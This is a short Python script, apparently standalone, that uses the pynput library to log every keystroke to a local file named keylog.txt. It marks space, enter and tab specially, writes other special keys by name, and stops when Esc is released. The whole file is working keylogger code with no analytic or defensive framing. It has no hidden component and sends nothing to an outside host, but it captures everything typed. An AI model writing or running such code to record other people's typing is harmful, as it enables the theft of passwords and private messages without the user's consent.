from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys like space, enter, etc.
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write('\n')
        elif key == keyboard.Key.tab:
            with open(log_file, "a") as f:
                f.write('\t')
        else:
            with open(log_file, "a") as f:
                f.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
